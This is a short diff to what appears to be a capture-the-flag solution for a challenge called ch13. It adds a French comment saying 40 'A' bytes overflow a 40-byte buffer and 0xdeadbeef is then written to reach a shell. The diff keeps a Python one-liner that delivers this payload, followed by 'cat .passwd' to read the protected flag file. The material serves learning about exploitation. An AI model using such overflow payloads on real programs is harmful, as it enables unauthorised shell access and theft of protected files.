@@ -1,3 +1,5 @@
+## nous utilisons 40 A pour overflow le buffer qui est de 40 puis nous passons l'adresse qui correspond a 0xdeadbeef pour pouvoir acceder au /bin/bash
+
 ( python -c 'print("A"*40 + "\xef\xbe\xad\xde")' && cat ) | ./ch13
 cat .passwd
 
